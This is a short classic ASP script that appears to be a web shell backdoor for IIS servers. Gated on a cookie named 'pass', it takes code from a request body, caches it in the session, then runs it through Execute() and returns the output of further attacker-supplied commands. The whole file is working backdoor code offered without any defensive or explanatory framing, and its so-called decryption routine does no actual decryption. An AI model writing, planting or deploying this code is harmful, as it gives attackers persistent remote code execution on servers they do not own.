<%
Set bypassDictionary = Server.CreateObject("Scripting.Dictionary")

Function decryption(content,isBin)
    dim size,i,result,keySize
    keySize = len(key)
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.CharSet = "iso-8859-1"
    BinaryStream.Type = 2
    BinaryStream.Open
    if IsArray(content) then
        size=UBound(content)+1
        For i=1 To size
            BinaryStream.WriteText chrw(ascb(midb(content,i,1)))
        Next
    end if
    BinaryStream.Position = 0
    if isBin then
        BinaryStream.Type = 1
        decryption=BinaryStream.Read()
    else
        decryption=BinaryStream.ReadText()
    end if

End Function
    content = request.BinaryRead(request.TotalBytes)
    if len(request.Cookies.Item("pass"))>0  then
        if  IsEmpty(Session("payload")) then
            content=decryption(content,false)
            Session("payload")=content
            response.End
        else
            bypassDictionary.Add "payload",Session("payload")
            Execute(bypassDictionary("payload"))
            result=run(content)
            if not IsEmpty(result) then
                response.BinaryWrite result
            end if
        end if
    end if
%>
